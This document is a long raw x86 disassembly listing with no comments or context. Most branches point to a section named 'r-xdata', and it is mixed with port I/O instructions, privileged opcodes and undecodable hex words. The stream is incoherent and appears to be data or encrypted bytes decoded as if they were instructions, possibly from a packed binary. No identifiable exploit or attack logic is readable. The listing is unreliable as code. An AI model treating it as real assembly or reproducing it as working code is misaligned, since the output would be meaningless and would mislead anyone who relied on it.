loop r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x51 ] ch
sbb al 0xbb
imul ebp [ edx ] 0x1eaf6b84
jb r-xdata
adc al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push es
imul esp [ 0x1d009b0a ] 0x22d1bb1d
or ebp [ ebx ]
in al dx
loop r-xdata
loop r-xdata
loop r-xdata
inc edx
sub al 0x1d
sbb eax 0xdfee2661
or [ eax ] 0xe2
jb r-xdata
jb r-xdata
out 0xaa al
jb r-xdata
sbb eax 0xe2f6280b
loop r-xdata
imul ebx [ esi + 0x14d1066f ] 0x280b2c69
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
sbb eax 0xe2e22655
jb r-xdata
sbb eax 0xe226551d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbb3a6952
jb r-xdata
jb r-xdata
imul esp [ edi + 0x35520b1a ] 0x1d
sbb eax 0x72727272
imul edi [ edx ] 0xbf6b84bb
cmp eax 0x52bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbe8bf6b
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edi
or bl [ 0x741db21d ]
dec esi
jb r-xdata
jb r-xdata
jb r-xdata
adc ebx [ 0xffffffff8ae6881d ]
mov ah 0x82
outsd
or ecx [ edi ]
pop ss
sbb eax 0x6469721d
popad
fild [ edx + 0xbe2e208 ]
push ebx
cmp al 0x1d
sbb eax 0x72727272
out dx al
jb r-xdata
push cs
popad
push cs
mov [ ebx - 0x7b6b7746 ] al
imul esp [ edi - 0x37f445ee ] 0x12
sbb eax 0x8872721d
retn 0xd80b
jl r-xdata
loop r-xdata
jb r-xdata
or eax 0x850b0fbd
loopne r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edx + esi * 4 + 0x1d18610a ] 0x1d
or eax [ eax + 0x5be2e2d7 ]
imul esp [ edi - 0x387745f8 ] 0xffffff84
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x3d7745f4 ] 0xffffff84
imul esp [ edi - 0x13b6f4ee ] 0xffffffe2
loop r-xdata
jb r-xdata
mov ch 0x6b
pop esp
loop r-xdata
cmp [ ecx + 0x5f ] ecx
jb r-xdata
in eax dx
jb r-xdata
xchg edi eax
sbb al 0x84
jb r-xdata
sbb eax 0xed72721d
and al 0xa
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
sbb eax 0x6971db2
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi - 0x2ecd967c ] 0x22
jb r-xdata
test [ ebx - 0x59 ] ch
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
mov dl 0x88
cld
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or eax [ eax ]
hlt
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x44c596ae ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
test [ ebx - 0x41 ] ch
call 0x1d60883c
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edx + 0x2c ]
sbb eax 0xee26611d
fild [ edx - 0x121d1df8 ]
loop r-xdata
mov bh 0xb
sbb eax 0xed1a9fdb
jb r-xdata
jb r-xdata
jno r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
loop r-xdata
push ds
sbb eax 0xe90bb21d
cmp ecx esi
loop r-xdata
or [ edx + 0x6b84c788 ] bh
cmpsd [ esi ] [ edi ]
push cs
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov dl al
test [ ebx - 0x59 ] ch
adc cl [ ebx ]
dec ecx
in al dx
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
mov dl 0xa
popad
sbb [ 0xffffffffd7800b1d ] bl
loop r-xdata
pop edi
jb r-xdata
loop r-xdata
push 0xffffffcf
jb r-xdata
add bl [ 0xffffffffb21d881d ]
or ebp [ ebx ]
loop r-xdata
imul ebx [ edi + 0xb1a6914 ] 0x2b
jb r-xdata
mov al ah
or ebx ebp
adc eax 0x72721d1d
sbb eax 0x109f6b84
imul ebx [ ebx ] 0x169f6b84
jb r-xdata
sbb eax 0x971db21d
mov bl 0x28
jb r-xdata
mov cl 0xb
pop edi
xor [ 0x1a61721d ] ebx
jecxz r-xdata
sbb eax 0xa70b0697
jb r-xdata
shl [ edx ] 0x1
imul esi [ edi - 0x7f77477e ] 0xffffff84
jb r-xdata
sbb eax 0xbb51297
xchg esp eax
in al 0xe2
jb r-xdata
test [ ecx + 0x32 ] ch
jb r-xdata
xchg edx eax
mov bh 0x84
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
outsd
adc [ 0x7272721d ] ebx
jb r-xdata
and ah [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x1d3b680b
sbb ebx ebp
or esi [ ebp + 0x72e2e2f2 ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xf6280b1d
jb r-xdata
and [ edx + 0x72 ] esi
bound ebp [ eax ]
sbb eax 0x2267bb1d
in eax dx
mov [ 0x1d3c ] al
sbb eax 0xb2bea76f
or eax ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
mov cl 0xb1
jb r-xdata
test [ ebx - 0x51 ] ch
mov ebx 0x50bf6b84
jb r-xdata
jb r-xdata
push edx
jb r-xdata
jb r-xdata
jb r-xdata
enter 0x1d24 0x1d
popad
mov edi 0x1ac60be8
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ si ] [ di ]
lahf
jb r-xdata
jb r-xdata
sbb eax 0x1e971d1d
cmp ebp ebp
fist [ ebx ]
scasb [ edi ]
add ebx [ 0x1d72721d ]
mov ch 0x1d
je r-xdata
adc ebx [ 0x1e971d1d ]
mov cl 0xb
fstp [ esi ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
add bl [ 0x3aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
pop eax
test [ ebx - 0x59 ] ch
push ss
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
mov ah 0xb5
imul ebx [ edx ] 0x6e0b39d1
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbe2e2e2
pop ebx
push cs
loop r-xdata
sbb cl [ ebx ]
adc al 0x69
jb r-xdata
imul ebx [ esp + eax * 4 ] 0x69149f6b
imul ebx [ edi - 0x7be496f0 ] 0x6b
lahf
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ eax + 0x6b848088 ] 0xb7
jb r-xdata
sbb eax 0xa7698ab4
shl [ edx ] 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
fldenv [ ecx ]
or esp esp
test [ ebx + ebp * 2 - 0x68967569 ] 0x9e
xor dl cl
jb r-xdata
imul esi [ edx ] 0x6b8422d1
jb r-xdata
sbb eax 0x4180b1d
sbb eax 0xa725721d
call 0x6f62e593
outsd
sub bl [ edi ]
imul ebx [ ebx ] 0x209f6b84
imul ebx [ esp + eax * 4 ] 0x88269f6b
mov ah 0xb
push ebx
sbb eax 0x7272721d
mov bh 0x69
push cs
mov bl 0xb
sub [ ebx ] ecx
mov esp 0x72212bb9
jb r-xdata
push cs
pop ds
sbb eax 0x800bb21d
int1
loop r-xdata
sbb eax 0x6f727272
jb r-xdata
mov ah bh
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
or dl ah
mov dl 0xb1
jb r-xdata
sahf
outsd
push es
rcl [ ecx + ebp * 2 ] 0x1
sub al 0xb
sub al dh
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + edi + 0x1d ]
sbb eax 0x72727272
xchg [ 0x7c0beab5 ] bl
mov dl al
shl [ edx ] 0x1
mov dh dh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
cmp bh [ ebx + 0x50bf6b84 ]
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ebp + 0x72727221 ]
jb r-xdata
jb r-xdata
or eax esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + ebp * 8 - 0x1e ]
loop r-xdata
imul ebp esi 0xfffffff4
or ebx [ edi + 0x721d1d16 ]
in eax dx
push ss
shl edx 0x1
loop r-xdata
loop r-xdata
sbb eax 0xd6e90bb2
mov cl 0x6f
jb r-xdata
in eax dx
jb r-xdata

sbb ah [ edi + 0x1d ]
in eax dx

mov ch 0x69
sbb dl cl
cmp [ ebx ] ecx
outsb
jb r-xdata
loop r-xdata
test eax esp
mov ebp 0xe0850b0f
sub ebx [ eax ]
sbb eax 0xdb88a1d
imul ecx [ esi ] 0xb1ee0e61
mov ch 0xb
sbb eax 0x1a9fdb1d
in eax dx
jb r-xdata
jb r-xdata
int 0xd5
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x1ab76b16 ] 0x69
jb r-xdata
outsd
jb r-xdata
scasd [ edi ]
jb r-xdata
mov eax [ edi - 0x79e558db ]
jb r-xdata
aad 0xe2
mov dl 0x6f
popad
out dx al
sub ebp ebp
jb r-xdata
push ss
adc [ ecx + 0x1b ] ch
test [ ebx - 0x61 ] ch
jb r-xdata
mov dl 0x1d
jb r-xdata
sub [ 0xffffffffb5b5b51d ] bl
cmpsd [ esi ] [ edi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x326984b7 ] es
mov [ eax - 0x7f48947c ] al
jb r-xdata
call sub_45e591
sbb eax 0x1f2a6f6f
jb r-xdata
jb r-xdata
jb r-xdata
and al [ ebx + ebp * 2 - 0x58906d59 ]
jb r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
loop r-xdata
out dx al
fldenv [ ecx ]
sub ah al
mov dl 0x6f
jb r-xdata
or edi [ edi + 0x72e2e2f8 ]
sahf
adc ch ch
pushad
hlt
sbb eax 0x72727272
in eax dx
cmp [ eax - 0x7948947c ] 0x88
test [ eax - 0x7358947c ] edi
jb r-xdata
jb r-xdata
sbb eax 0x530b0697
jb r-xdata
jb r-xdata
sbb eax 0x1dd1eab4
or ebp [ 0x721d1d0e ]
jb r-xdata
mov [ esp + eax * 4 - 0x45c95895 ] cl
mov [ esi + 0x34a76b84 ] dl
shl [ edx ] 0x1
or edi [ esi ]
cmp [ 0x7272721d ] bl
jl r-xdata
mov dl 0x69
and al 0xa
cli
mov cl 0xb1
mov cl 0xb1
outsd
loop r-xdata
loopne r-xdata
sbb eax 0x7c0beab5
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
sbb bl [ 0x7272721d ]
sbb eax 0x37220baa
test [ ebx - 0x49 ] ch
mov eax 0x1d044d0b
loop r-xdata
jb r-xdata
mov dl 0x88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
sbb eax 0xc2887272
or ebx eax
mov ebp 0x72727221
jb r-xdata
bound ebx [ bx ]
jb r-xdata
or edx [ eax + 0x72e2e2c2 ]
jb r-xdata
xor eax 0xa4e2e2d4
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x88f20e61
cmp [ edx + 0x6b849488 ] 0xffffffa7
adc bh [ edx + 0x1d12c80b ]
or [ 0xb22d11d ] ebx
mov [ 0x721d1d09 ] eax
jb r-xdata
fistp [ edi - 0x589812e6 ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
mov dl 0xb
jmp 0x73288b13
outsd
push ss
jb r-xdata
loop r-xdata
in eax dx
sbb eax 0xff180b1d
loop r-xdata
sub bl [ edi ]
jb r-xdata
mov ah 0xce
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
jb r-xdata
and eax 0x8e861aa7
jb r-xdata
imul esp [ esi + edx * 8 - 0x1d168ef5 ] 0x727272e2
jb r-xdata
sbb eax 0x180f0b1d
or ecx [ esi + 0x37 ]
sbb eax 0x3b69721d
mov [ ecx + 0x4ebf6b84 ] al
mov ecx 0x4cbf6b84
mov [ ecx + 0x5caf6b84 ] dl
mov ebx 0x6b849688
scasd [ edi ]
and [ ebx + 0x6b849788 ] bh
sub eax [ edx ]
loop r-xdata
jb r-xdata
sbb eax [ ebx + ebp * 2 + 0x1c69169f ]
jb r-xdata
xchg edi eax
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x69
cmpsd [ esi ] [ edi ]
sbb ch [ ecx + 0x62 ]
inc esi
loop r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
mov ch [ ecx - 0x59 ]
sbb eax [ ebx + ebp * 2 + 0x1c69209f ]
imul ebx [ ebx ] 0xede31d61
jb r-xdata
popad
jb r-xdata
imul esp [ edi - 0x958906e ] 0xffffff84
imul edx [ edi - 0x61689676 ] 0xb
mov edi 0x72e2e2f8
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
cmpsd [ esi ] [ edi ]
pop edx
scasd [ edi ]
scasd [ edi ]
mov edx 0x5ea72587
mov dl 0x1d
loop r-xdata
jb r-xdata
loop r-xdata
leave
jb r-xdata
sbb eax 0x2fd90b1d
sbb eax 0x7272721d
or esi ebp
out 0xe2 al
loop r-xdata
imul ecx [ esi ] 0xb290bb3
xchg [ eax + 0x6b84b885 ] cl
cmpsd [ esi ] [ edi ]
test [ ebx - 0x49 ] ch
or bh [ edi + 0x3 ]
or edx [ ebx ]
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x88
retn 0xb1b1
loop r-xdata
loop r-xdata
or dl ah
jb r-xdata
0xe2e07c0b 0x72e2
jb r-xdata
imul ebp [ edi + 0xb8b8824 ] 0xffffffe2
stc
jb r-xdata
jb r-xdata
mov edi 0xaf6b8450
jb r-xdata
jb r-xdata
or cl al
and al 0x1d
sbb eax 0xbee2661
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fst [ 0x72721d1d ]
loopne r-xdata
jb r-xdata
or esi [ esi ]
clc
loop r-xdata
mov [ eax + 0x6b843c69 ] dl
mov edi 0xd2800bb0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ebp [ ebx ]
and [ edx + 0x72 ] esi
mov esp 0x72e2e2c1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
hlt
test [ ecx - 0x26 ] ah
loop r-xdata
sbb eax 0x740bb21d
in al dx
pop ds
jb r-xdata
or edi [ edi - 0x1e ]
or edx [ edi + 0xa721d1d ]
arpl cx di
loop r-xdata
loop r-xdata
and ebp ebp
sbb ch ch
mov cl 0xb1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bh 0x1a
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah ch
loop r-xdata
sbb eax 0x676feab4
pop esi
sbb [ 0xffffffffb41db21d ] bl
shl [ edx ] 0x1
mov [ 0xffffffffe2fa270b ] al
mul edx
loop r-xdata
xchg edi eax
push cs
push ds
sbb ch [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esi [ edi + 0x6b84b802 ] 0xffffffb7
add cl dl
xor [ ebx ] cl
xchg edx eax
cli
loop r-xdata
salc
jb r-xdata
jb r-xdata
mov edi 0xe0050a12
loop r-xdata
cmc
loop r-xdata
and ch ch
0x88e2e2e2 0x1de2
sbb eax 0xb21d881d
jb r-xdata
imul ebx [ edi - 0x7be396ea ] 0x6b
lahf
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x86b76b84
mov bh 0x80
jb r-xdata
jb r-xdata
fistp [ edi - 0x598120a ]
loop r-xdata
cli
loop r-xdata
popad
jb r-xdata
mov [ es : ebx + ecx + 0x1d1d3653 ] dh
lahf
loop r-xdata
xchg edi eax
adc dh [ ebp - 0x1d1b6bf5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x1d04180b
sbb eax 0x56a72572
mov ecx 0xe2e067ed
jb r-xdata
sbb eax 0xb72721d
jb r-xdata
sbb eax 0x9367ede3
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
sbb ch [ ecx + 0x3c ]
test [ ebx - 0x41 ] ch
sbb [ ecx + 0x3a ] ch
or ebp ebp
inc edx
pop ds
sbb eax 0xb51db21d
mov dl 0xb1
sbb eax 0xe2e24e75
loop r-xdata
mov cl 0xb1
mov cl 0x6f
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d231e
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
loop r-xdata
sub ebp ebp
jb r-xdata
loop r-xdata
sbb eax 0x4e741db2
jb r-xdata
imul esp [ edi - 0x6e7745fe ] 0xffffff84
imul esp [ edi - 0x20f44600 ] 0xffffffec
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbb0bf6b
jb r-xdata
or bh cl
cli
jb r-xdata
mov ebx 0xe2ff770b
loop r-xdata
jb r-xdata
salc
popad
mov ch 0xa
xchg [ 0xffffffff8e861aa7 ] esp
jb r-xdata
loop r-xdata
imul edx [ edx ] 0xe2d5cd0b
loop r-xdata
sbb eax 0xec740bb2
pop ss
fldenv [ ecx ]
in eax dx
and al 0xca
jb r-xdata
loop r-xdata
or esi edx
call 0x6e5189b6
cmp eax 0x72721d1d
jb r-xdata
outsd
jb r-xdata
or esi [ ecx - 0x17 ]
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
0x1f9e676f 0x1d1d
loop r-xdata
jb r-xdata
or esi [ edi - 0x1 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jmp 0x72b88c03
loop r-xdata
jb r-xdata
jno r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
cdq
and [ 0x180f0b1d ] ebx
push edi
xor bl [ edi ]
mov [ 0xbe088b2 ] bl
outsd
jb r-xdata
and [ 0x22d1721d ] ebx
loop r-xdata
jb r-xdata
sbb eax 0x2bd186b4
loop r-xdata
jecxz r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
outsd
jb r-xdata
popad
cdq
adc eax 0x7272213a
jb r-xdata
mov ah 0xea
popad
sbb bl [ 0x692377ed ]
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
loop r-xdata
in eax dx
xchg ebx eax
in eax dx
mov [ edx + 0x1d05950b ] ah
jg r-xdata
and ebp [ ecx + 0x1b ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x32676f1d
pop ds
sbb eax 0x1db1b21d
mov ch 0xf6
imul edx [ edi + 0x32 ] 0x1f
out 0x19 al
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x370bb41d
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xae
or eax eax
add [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
outsd
test [ ebx - 0x49 ] ch
sub ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
mov ch 0x6f
adc dl 0xe2
test [ ebx - 0x41 ] ch
mov al 0xb
mov dl 0x6b
mov edi 0xe3b20b1e
loop r-xdata
sbb eax 0xceb41db2
jb r-xdata
loop r-xdata
jb r-xdata
inc eax
or al [ ebp + 0x611d1d3c ]
out dx al
ja r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al [ esi + 0xbcc8e8e ]
add ecx [ edx ]
sbb eax 0xb2b3721d
test [ ebx - 0x49 ] ch
add bh [ eax + 0xb76b84 ]
shl [ eax ] 0x1
or edx [ edx + 0x72e2e2fa ]
jb r-xdata
jne r-xdata
jb r-xdata
jb r-xdata
dec ebp
salc
out dx al
jb r-xdata
bound ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
test [ es : ebx ] 0x2b
aad 0xe2
loop r-xdata
mov dl dh
outsd
cmpsd [ esi ] [ edi ]
push es
mov cl 0xb
pop ecx
jmp r-xdata
mov dl 0xa
test [ ebx - 0x11d99ee3 ] edi
imul esp [ edi + 0x1aa76906 ] 0x6b
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x49 ] ch
push es
mov eax 0x1d0fe50b
sbb eax 0x72727272
push esi
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub bl [ bx ]
sbb eax 0x950bbb72
cmp al 0x1d
sbb eax 0xd6941d72
or esp [ esi - 0x10 ]
mov [ 0x1d05950b ] al
test [ ebx - 0x69 ] ch
mov ch [ ecx - 0x69 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sub ebx [ 0x3b680b1d ]
sbb eax 0x7272721d
or ebp [ esi + 0x13 ]
sbb eax 0x7272721d
sub dh dh
sbb esp [ ecx + 0x1d ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
and al 0xb
push ds
and ebx [ 0x7272721d ]
jb r-xdata
aaa
jb r-xdata
jb r-xdata
sbb eax 0xa90bb694
add al 0x1d
out 0x19 al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
sbb [ eax + 0x1e6c0b80 ] cl
jb r-xdata
nop
or esp [ edi ]
and [ edx + 0x72 ] esi
sbb eax 0x72727272
mov ah dl
loop r-xdata
mov bh 0x10
mov eax 0x6b848e88
outsd
sub dx di
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jmp edx
loop r-xdata
jb r-xdata
imul esp [ edi + 0x16a725ea ] 0x878b8091
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
xchg edi eax
sbb eax 0xe2e21675
loop r-xdata
jb r-xdata

jb r-xdata
jb r-xdata
jb r-xdata
daa
jb r-xdata
push es
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb41db21d
xchg [ ecx + 0x2a ] ah
loopne r-xdata
pop ds
mov [ 0xffffffffb166ede2 ] al
pop ds
sbb eax 0x8ae2881d
adc edi edi
mov esp [ edx - 0x1d0523f5 ]
loop r-xdata
sbb eax 0x9961eab4
jb r-xdata
sub bl [ bx ]
sbb eax 0xb41db21d
outsd
push ebp
test [ ebx - 0xe ] ch
test [ edi + 0x30 ] ah
in eax dx
pop ds
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
or ebp [ esi ]
or ebx [ 0x7272721d ]
mov [ ebx - 0x40947b47 ] cl
push ss
imul edi [ 0x14bf6b84 ] 0x6b843a69
mov edi 0x843c691a
imul edi [ edi + 0xb3a6918 ] 0xffffffed
jb r-xdata
jb r-xdata
push ebp
not [ ebx + 0x1d21940b ]
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0xa7611aa7
jb r-xdata
jb r-xdata
lodsb [ esi ]
cli
loop r-xdata
loopne r-xdata
jb r-xdata
and ch ch
dec bx
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
push ss
or esp ebp
or eax 0x72721d1d
sbb eax 0x72212b1d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi [ edx ] 0x28b76b84
mov [ esi + 0x2ab76b84 ] cl
mov edi 0x6366ed1e
mov ch 0xb
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0x9116a725 0x8b80
sahf
pop ds
sbb eax 0x530bb21d
iretd
pop edx
jb r-xdata
outsd
loop r-xdata
mov esp 0x72212bb9
jb r-xdata
jb r-xdata
imul esp [ edi + 0xaa76b1a ] 0xb16a769
jb r-xdata
loop r-xdata
cmp al 0x84
imul edi [ edi - 0x2d7ff450 ] 0xffffffe2
jb r-xdata
loop r-xdata
jb r-xdata
or ch [ ecx - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
out dx al
loop r-xdata
jb r-xdata
sbb al [ ebx + ebp * 2 - 0x5890f351 ]
and dl cl
sub esi [ ebx + ecx + 0x1d1d3c74 ]
jb r-xdata
and cl [ eax - 0x58947b0a ]
jb r-xdata
imul edx [ edi + 0x6ae468ea ] 0x30d1dbe6
imul esp [ ebx ] 0x1d5fa80b
sbb eax 0x35840a72
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
mov ebp 0x6b84a088
lahf
push edx
mov ebp 0x509f6b84
sbb eax 0x1d3fe30b
sbb eax 0xd1727272
sbb eax 0x1e9f6b84
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2e3e68a
loop r-xdata
push ds
0xbbbb
push ebp
movsb [ edi ] [ esi ]
in al 0x1d
add ah dh
loop r-xdata
popad
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb ah [ ecx - 0x59 ]
in eax dx
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ esp + eax * 4 + 0xb06b76b ] cl
outsd
jb r-xdata
mov esp 0x3ca50aaa
sbb eax 0xd6a46b1d
jb r-xdata
mov dl 0xa
jb r-xdata
sub esp [ ecx ]
jb r-xdata
sbb eax 0x4b0b1697
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
loop r-xdata
loop r-xdata
jb r-xdata
lahf
adc al 0x84
imul esi [ edi + 0xb8b88be ] 0xffffffa8
mov cl 0x6f
and ch ch
jb r-xdata
jb r-xdata
mov dl 0x71
jb r-xdata
or dh dl
mov cl 0xb2
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
xchg edi eax
imul edi [ edi - 0x1c4df4e2 ] 0xffffffe2
loop r-xdata
call 0x7262c6dd
imul esp [ edi + 0x16a7690a ] 0xb
jb r-xdata
jb r-xdata
jb r-xdata
sbb ecx [ edx + 0x205260ed ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsb
adc ebx [ 0x7272721d ]
pop sp
imul esi edx 0xffffff84
xor ch ch
jb r-xdata
jb r-xdata
call 0xffffffffa70fa9c3
aaa
jb r-xdata
loop r-xdata
imul edi [ edx + ebp * 4 + 0x1d3ca50a ] 0x1d
imul esp [ esi + edx * 8 - 0x7cbbbf76 ] 0x9
jb r-xdata
cmp ebx [ 0x7272721d ]
jb r-xdata
fstp [ esi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
loop r-xdata
mov ch 0x1d
jb r-xdata
sbb eax 0xa340b1d
jb r-xdata
jb r-xdata
stc
or [ ebx + 0x1aa72587 ] 0x86
in eax dx
xchg ecx eax
loop r-xdata
jb r-xdata
imul edi [ edx ] 0x66ed3967
fist [ ebx ]
scasd [ edi ]
test [ edx ] 0x6
loop r-xdata
bound ebp [ ebx - 0x41 ]
sbb eax 0xe2e21a75
out dx al
jb r-xdata
loop r-xdata
mov ecx [ ebx ]
loop r-xdata
mul edx
imul edi [ edi - 0x60947bfc ] 0x14
test [ ebx - 0x49 ] ch
mov esi 0xa80b8b88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ esi + edi * 8 + 0x1d35380a ] 0x1d
mov ch [ edi ]
jb r-xdata
sbb eax 0xb20ea76f
imul esp [ edx + ecx ] 0x1d1d35b0
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
rcr [ 0x1e9f6b84 ] 0x1
mov bh ch
or bl [ eax + 0x611d1d5d ]
out dx al
jb r-xdata
sbb cl [ edx - 0x1d1d1c1a ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
sbb eax 0xa340b1d
jb r-xdata
or bl bl
jb r-xdata
0xbc16b8a 0xf9e2
jb r-xdata
push cs
dec ebx
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
sbb eax 0x1d0a340b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ ebx - 0x3 ]
loop r-xdata
or bl [ 0xffffffffb2b3721d ]
jb r-xdata
movhps [ 0x6469721d ] xmm3
mov eax 0xe2d8d60b
jb r-xdata
jb r-xdata
mov dl 0xb
loop r-xdata
in eax dx
inc esi
cmp eax 0x22d11d1d
and [ edx + 0x72 ] esi
jb r-xdata
add ebx [ 0xffffffffee26611d ]
jb r-xdata
imul esp [ edi + 0xee80b16 ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ 0x721d1d1f ]
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
imul edi [ edi + 0x16af6b1e ] 0x6b
in eax dx
movsb [ edi ] fs : [ esi ]
mov ch 0x6b
movsb [ edi ] [ esi ]
retn 0xea0b
loopne r-xdata
dec [ edx ]
cmp [ 0x2f8a1d1d ] dh
jb r-xdata
sbb eax 0xe2e8130b
loop r-xdata
